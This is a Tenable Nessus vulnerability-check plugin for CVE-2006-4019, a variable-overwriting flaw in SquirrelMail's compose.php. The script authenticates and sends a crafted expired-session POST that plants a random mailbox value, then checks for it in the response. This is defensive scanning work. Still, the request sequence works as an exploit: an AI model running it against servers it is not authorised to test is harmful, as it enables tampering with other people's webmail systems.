#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(22230);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2006-4019");
  script_bugtraq_id(19486);
  script_osvdb_id(27917);

  script_name(english:"SquirrelMail compose.php session_expired_post Arbitrary Variable Overwriting");
  script_summary(english:"Tries to overwrite a variable SquirrelMail");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote webmail application suffers from a data modification
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The installed version of SquirrelMail allows for restoring expired
sessions in an unsafe manner.  Using a specially crafted expired
session and compose.php, a user can leverage this issue to take 
control of arbitrary variables used by the affected application, 
which can lead to other attacks against the system, such as reading 
or writing of arbitrary files on the system." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00108-08112006" );
 script_set_attribute(attribute:"see_also", value:"http://www.squirrelmail.org/security/issue/2006-08-11" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2006/Aug/240" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch referenced in the vendor advisory above or upgrade to
SquirrelMail version 1.4.8 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/08/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/08/11");
 script_cvs_date("$Date: 2016/11/03 21:08:35 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:squirrelmail:squirrelmail");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("squirrelmail_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("imap/login", "imap/password", "www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


# nb: the vulnerabilities can't be exploited without being authenticated.
user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/squirrelmail"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  init_cookiejar();
  # Exploit the flaw.
  sid = hexstr(MD5(string(SCRIPT_NAME, "_", unixtime())));
  magic = rand_str();
  postdata = string(
    "username=", user, "&",
    "mailbox=", magic
  );
  set_http_cookie(name:"SQMSESSID", value:sid);
  r = http_send_recv3(method: "POST", item: strcat(dir, "/src/compose.php"), port: port,
 add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
 data: postdata);
  if (isnull(r)) exit(0);

  # Login.
  postdata = string(
    "login_username=", user, "&",
    "secretkey=", pass, "&",
    "js_autodetect_results=0&",
    "just_logged_in=1"
  );
  set_http_cookie(name:"SQMSESSID", value:sid);
  r = http_send_recv3(method: "POST", item: strcat(dir, "/src/redirect.php"), port: port,
 add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
 data: postdata);
  if (isnull(r)) exit(0);
  if (get_http_cookie(name: "SQMSESSID") == "deleted") {
    debug_print("couldn't login with supplied imap credentials!\n");
    exit(0);
  }
  # - and get the secret key.
  key = get_http_cookie(name: "key");
  # If we have the secret key...
  if (key)
  {
    set_http_cookie(name:"SQMSESSID", value:sid);
    # See whether the exploit worked.
    r = http_send_recv3(method: "GET", item:string(dir, "/src/compose.php"), port:port);
    if (isnull(r)) exit(0);

    # There's a problem if we see our magic mailbox name.
    if (string(".php?mailbox=", magic) >< r[2])
    {
      security_warning(port);
      exit(0);
    }
  }
}
